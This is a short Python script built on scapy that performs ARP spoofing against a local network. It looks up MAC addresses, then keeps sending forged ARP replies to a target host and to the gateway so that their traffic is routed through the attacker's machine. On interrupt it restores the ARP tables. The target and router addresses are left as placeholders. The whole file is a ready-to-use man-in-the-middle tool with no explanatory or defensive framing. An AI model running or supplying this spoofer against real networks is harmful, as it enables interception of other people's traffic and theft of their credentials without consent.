#!/usr/bin/env python3

import scapy.all as scapy
import time
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_mac(ip):
    arp_check = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_cb = broadcast/arp_check
    answered_list = scapy.srp(arp_cb, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
   
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)    
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "put target ip"
gateway_ip = "put router ip"

try:
    count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        count = count +1
        print("\r" + str(count) + " packets sent", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-]Detected Interrupt....... Resetting ARP tables.\n")
    restore(target_ip, gateway_ip)
    
